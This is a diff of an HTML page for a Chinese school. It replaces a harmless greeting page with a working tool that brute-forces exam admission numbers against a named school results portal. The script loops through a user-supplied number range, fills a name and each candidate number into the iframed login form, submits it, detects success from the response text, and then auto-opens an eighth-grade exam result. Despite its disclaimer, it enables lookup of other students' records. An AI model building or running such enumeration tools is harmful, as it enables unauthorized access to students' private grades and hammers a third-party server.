@@ -1,236 +1,368 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>琼山二中</title>
-<style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  font-family: "MiSans", "PingFang SC", sans-serif;
-  -webkit-tap-highlight-color: transparent;
-}
-
-body {
-  width: 100vw;
-  height: 100vh;
-  overflow: hidden;
-  background: #000;
-  color: #fff;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  padding: 0 30px;
-}
-
-/* 雪花画布 */
-.snow {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  pointer-events: none;
-  z-index: 9999;
-}
-
-/* 大头儿子 */
-.head-img {
-  width: 200px;
-  height: 200px;
-  object-fit: contain;
-  border: 2px solid #111;
-  border-radius: 12px;
-  margin-bottom: 30px;
-  filter: drop-shadow(0 0 8px rgba(255,255,255,0.3));
-}
-
-/* 文字发光 */
-.title-text {
-  font-size: 17px;
-  text-align: center;
-  line-height: 1.8;
-  margin-bottom: 40px;
-  color: #fff;
-  text-shadow: 0 0 10px #ffffff, 0 0 20px #ffffff, 0 0 30px #ffffff;
-  animation: glowText 2.5s infinite alternate;
-}
-@keyframes glowText {
-  from { text-shadow: 0 0 8px #fff, 0 0 16px #fff; }
-  to   { text-shadow: 0 0 14px #fff, 0 0 28px #fff, 0 0 40px #fff; }
-}
-
-/* 液态玻璃按钮 + 发光 */
-.know-btn {
-  padding: 16px 42px;
-  background: rgba(255, 255, 255, 0.08);
-  border: 1px solid rgba(255, 255, 255, 0.3);
-  border-radius: 18px;
-  color: #fff;
-  font-size: 17px;
-  font-weight: 500;
-  backdrop-filter: blur(16px);
-  -webkit-backdrop-filter: blur(16px);
-  box-shadow: 
-    0 0 0 1px rgba(255,255,255,0.2),
-    0 8px 20px rgba(0,0,0,0.2),
-    0 0 25px rgba(255,255,255,0.25);
-  text-shadow: 0 0 8px #fff, 0 0 16px #fff;
-  cursor: pointer;
-  transition: all 0.3s ease;
-}
-.know-btn:active {
-  background: rgba(255,255,255,0.18);
-  box-shadow: 0 0 30px rgba(255,255,255,0.45);
-  transform: scale(0.96);
-}
-
-/* 灵动岛风格视频弹窗 */
-.island-modal {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.7);
-  z-index: 8888;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  opacity: 0;
-  visibility: hidden;
-  transition: all 0.4s ease;
-}
-.island-modal.show {
-  opacity: 1;
-  visibility: visible;
-}
-
-/* 灵动岛盒子：白色边框 + 圆角 */
-.island-box {
-  width: 280px;
-  height: 160px;
-  border: 2px solid #fff;
-  border-radius: 32px;
-  overflow: hidden;
-  position: relative;
-  transform: scale(0.8) translateY(-40px);
-  transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-}
-.island-modal.show .island-box {
-  transform: scale(1) translateY(0);
-}
-
-/* 视频铺满 */
-.island-video {
-  position: absolute;
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>信谢开发的</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "PingFang SC", "Helvetica Neue", sans-serif;
+        }
+        body {
+            background: #000000;
+            min-height: 100vh;
+            padding: 24px 16px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg,transparent 0%,rgba(255,0,0,0.08),rgba(255,165,0,0.08),rgba(255,255,0,0.08),rgba(0,255,0,0.08),rgba(0,0,255,0.08),rgba(128,0,128,0.08),transparent);
+            animation: streamLight 8s linear infinite;
+            pointer-events: none;
+        }
+        @keyframes streamLight {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 12px;
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: 600;
+            text-shadow: 0 0 8px #fff,0 0 16px #fff;
+        }
+        #status {
+            text-align: center;
+            font-size: 17px;
+            color: #e2e8f0;
+            margin-bottom: 20px;
+            min-height: 24px;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 6px #fff;
+        }
+        #status.success {
+            color: #ffffff;
+            text-shadow: 0 0 10px #fff,0 0 20px #fff;
+        }
+        #btn, #openBtn {
+            display: block;
+            margin: 0 auto 12px auto;
+            padding: 12px 36px;
+            background: rgba(0,0,0,0.2);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            color: white;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            animation: borderRain 8s linear infinite;
+            box-shadow: 0 0 15px #fff;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 8px #fff;
+        }
+        @keyframes borderRain{
+            0%{border:1px solid #ff0000;box-shadow:0 0 20px #ff0000;}
+            20%{border:1px solid #ff9900;box-shadow:0 0 20px #ff9900;}
+            40%{border:1px solid #ffff00;box-shadow:0 0 20px #ffff00;}
+            60%{border:1px solid #00ff00;box-shadow:0 0 20px #00ff00;}
+            80%{border:1px solid #0066ff;box-shadow:0 0 20px #0066ff;}
+            100%{border:1px solid #9900ff;box-shadow:0 0 20px #9900ff;}
+        }
+        #btn:hover, #openBtn:hover {
+            background: rgba(255,255,255,0.05);
+            transform: translateY(-2px);
+        }
+        .glassWrap {
+            border-radius: 20px;
+            padding: 8px;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            animation: borderRain 8s linear infinite;
+            margin: 0 auto 20px auto;
+            max-width: 600px;
+        }
+        iframe {
+            width: 100%;
+            height: 600px;
+            border: none;
+            border-radius: 16px;
+            background: #ffffff;
+        }
+        #rangeModal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .modal-content {
+            background: rgba(30, 30, 30, 0.8);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            padding: 32px;
+            border-radius: 20px;
+            width: 320px;
+            animation: borderRain 8s linear infinite;
+        }
+        .modal-content h3 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
+            text-shadow: 0 0 8px #fff;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 12px;
+            font-size: 16px;
+            background: rgba(255,255,255,0.05);
+            color: #e2e8f0;
+            outline: none;
+            box-shadow: 0 0 6px rgba(255,255,255,0.15) inset;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 6px #fff;
+            animation: borderRain 8s linear infinite;
+        }
+        .modal-content button {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0,0,0,0.2);
+            backdrop-filter: blur(10px);
+            color: #fff;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 8px #fff;
+            animation: borderRain 8s linear infinite;
+        }
+        #nameModal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .agreePop {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 99999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .agreeBox {
+            background: rgba(30, 30, 30, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            padding: 40px 32px;
+            border-radius: 24px;
+            width: 360px;
+            text-align: center;
+            animation: borderRain 8s linear infinite;
+        }
+        .agreeBox p {
+            color: #e2e8f0;
+            font-size: 15px;
+            line-height: 2;
+            margin-bottom: 32px;
+            text-shadow: 0 0 8px #fff;
+        }
+        .agreeBtn {
+            padding: 14px 40px;
+            background: rgba(0,0,0,0.2);
+            backdrop-filter: blur(12px);
+            color: #fff;
+            border-radius: 16px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 8px #fff;
+            animation: borderRain 8s linear infinite;
+        }
+        .agreeBtn:hover {
+            background: rgba(255,255,255,0.05);
+            transform: scale(1.05);
+        }
+    </style>
 </head>
-
 <body>
+    <div class="agreePop" id="agreePop">
+        <div class="agreeBox">
+            <p>进此网站仅供查询自己成绩<br>忘记准考证号请勿查询他人成绩<br>任何违法使用行为均与开发者无关</p>
+            <button class="agreeBtn" onclick="closeAgree()">同意进入</button>
+        </div>
+    </div>
 
-<!-- 雪花 -->
-<canvas class="snow" id="snow"></canvas>
+    <h2>准考证自动查询:打不开自己去别的地方输准考证:姓谢的搞的</h2>
+    <div id="status">等待设置区间...</div>
+    <button id="btn" onclick="startBrute()">开始</button>
 
-<!-- 灵动岛视频弹窗 -->
-<div class="island-modal" id="island">
-  <div class="island-box">
-    <video class="island-video" src="A.mp4" loop playsinline></video>
-  </div>
-</div>
+    <div class="glassWrap">
+        <iframe id="frm" src="http://qhsjyj.yhsvr.cn:9999/student/result.html"></iframe>
+    </div>
 
-<!-- 大头儿子 -->
-<img src="11.png" class="head-img">
+    <button id="openBtn" onclick="quickQuery()">立即查询</button>
 
-<!-- 文字 -->
-<div class="title-text">
-祝琼山二中的同学们<br>
-少起飞 少挖矿<br>
-好好学习 天天向上
-</div>
+    <div id="rangeModal">
+        <div class="modal-content">
+            <h3>设置区间:</h3>
+            <input id="startInput" placeholder="起始准考证号">
+            <input id="endInput" placeholder="结束准考证号">
+            <button onclick="setRange()">确定</button>
+        </div>
+    </div>
 
-<!-- 按钮 -->
-<button class="know-btn" onclick="showIsland()">我知道了</button>
+    <div id="nameModal">
+        <div class="modal-content">
+            <h3>输入姓名</h3>
+            <input id="nameInput" placeholder="请输入你的姓名">
+            <button onclick="confirmName()">确定</button>
+        </div>
+    </div>
 
 <script>
-// 灵动岛弹窗
-const island = document.getElementById("island");
-const video = document.querySelector(".island-video");
-
-function showIsland() {
-  island.classList.add("show");
-  video.currentTime = 0;
-  video.play();
+let trueKaoHao = "";
+function closeAgree() {
+    document.getElementById('agreePop').style.display = 'none';
 }
 
-function hideIsland() {
-  island.classList.remove("show");
-  video.pause();
-}
-
-// 点击任意空白关闭
-island.onclick = hideIsland;
-
-// 发光雪花
-const canvas = document.getElementById('snow');
-const ctx = canvas.getContext('2d');
-let w = canvas.width = window.innerWidth;
-let h = canvas.height = window.innerHeight;
-
-let snowflakes = [];
-class Snow {
-  constructor() {
-    this.x = Math.random() * w;
-    this.y = Math.random() * -h;
-    this.r = Math.random() * 1.7 + 0.8;
-    this.speed = Math.random() * 1.3 + 0.5;
-  }
-  update() {
-    this.y += this.speed;
-    if (this.y > h) {
-      this.y = -5;
-      this.x = Math.random() * w;
+// 立即查询：自动填入正确考号+选八年级+提交
+function quickQuery(){
+    if(!trueKaoHao) return;
+    let frm = document.getElementById('frm');
+    let doc = frm.contentDocument || frm.contentWindow.document;
+    let inputs = doc.querySelectorAll("input[type='text']");
+    if(inputs.length >= 2){
+        inputs[0].value = userName;
+        inputs[1].value = trueKaoHao;
     }
-  }
-  draw() {
-    ctx.beginPath();
-    ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
-    ctx.fillStyle = 'rgba(255,255,255,0.95)';
-    ctx.shadowColor = 'rgba(255,255,255,0.85)';
-    ctx.shadowBlur = 12;
-    ctx.fill();
-    ctx.shadowBlur = 0;
-  }
+    let selectBox = doc.querySelector("select");
+    if(selectBox){
+        for(let i=0;i<selectBox.options.length;i++){
+            if(selectBox.options[i].text.includes("八年级期末考试")){
+                selectBox.selectedIndex = i;
+                break;
+            }
+        }
+    }
+    setTimeout(()=>{
+        let btn = doc.querySelector("button");
+        if(btn) btn.click();
+    },200);
 }
 
-function createSnow() {
-  for (let i = 0; i < 120; i++) {
-    snowflakes.push(new Snow());
-  }
-}
-function animateSnow() {
-  ctx.clearRect(0, 0, w, h);
-  snowflakes.forEach(s => {
-    s.update();
-    s.draw();
-  });
-  requestAnimationFrame(animateSnow);
-}
-createSnow();
-animateSnow();
+let startNum = 0;
+let endNum = 0;
+let userName = "";
+let currentNum = 0;
+let timer = null;
+let lastNum = 0;
 
-window.onresize = () => {
-  w = canvas.width = window.innerWidth;
-  h = canvas.height = window.innerHeight;
-};
+function setRange() {
+    let s = document.getElementById('startInput').value.trim();
+    let e = document.getElementById('endInput').value.trim();
+    startNum = parseInt(s);
+    endNum = parseInt(e);
+    if (isNaN(startNum) || isNaN(endNum)) return;
+    if (startNum > endNum) return;
+    document.getElementById('rangeModal').style.display = "none";
+    document.getElementById('status').innerText = `已设置区间：${startNum} ~ ${endNum}`;
+}
+
+function startBrute() {
+    if (startNum === 0 || endNum === 0) return;
+    document.getElementById('nameModal').style.display = "flex";
+}
+
+function confirmName() {
+    userName = document.getElementById('nameInput').value.trim();
+    if (userName === "") return;
+    document.getElementById('nameModal').style.display = "none";
+    currentNum = startNum;
+    lastNum = 0;
+    trueKaoHao = "";
+    if(timer)clearInterval(timer);
+    timer = setInterval(loop, 600);
+}
+
+function loop() {
+    if (currentNum > endNum) {
+        clearInterval(timer);
+        timer = null;
+        document.getElementById('status').innerText = "全部遍历完成，未查询到";
+        document.getElementById('status').classList.remove('success');
+        return;
+    }
+    lastNum = currentNum;
+    let frm = document.getElementById('frm');
+    let doc = frm.contentDocument || frm.contentWindow.document;
+    let inputList = doc.querySelectorAll("input[type='text']");
+    if (inputList.length >= 2) {
+        inputList[0].value = userName;
+        inputList[1].value = currentNum;
+        let submitBtn = doc.querySelector("button");
+        if (submitBtn) submitBtn.click();
+    }
+    document.getElementById('status').innerText = "正在尝试：" + currentNum;
+    document.getElementById('status').classList.remove('success');
+    setTimeout(() => {
+        let text = doc.body.innerText;
+        if (text.includes("错误")) return;
+        if (text.includes("请选择考试")) {
+            clearInterval(timer);
+            timer = null;
+            trueKaoHao = lastNum - 1;
+            document.getElementById('status').innerText = "✅ 成功号码：" + trueKaoHao;
+            document.getElementById('status').classList.add('success');
+            let selectBox = doc.querySelector("select");
+            if (selectBox) {
+                for (let i = 0; i < selectBox.options.length; i++) {
+                    if (selectBox.options[i].text.includes("八年级期末考试")) {
+                        selectBox.selectedIndex = i;
+                        break;
+                    }
+                }
+            }
+            setTimeout(() => {
+                let finalSubmitBtn = doc.querySelector("button");
+                if(finalSubmitBtn) finalSubmitBtn.click();
+            },200);
+        }
+    }, 400);
+    currentNum++;
+}
 </script>
-
 </body>
 </html>
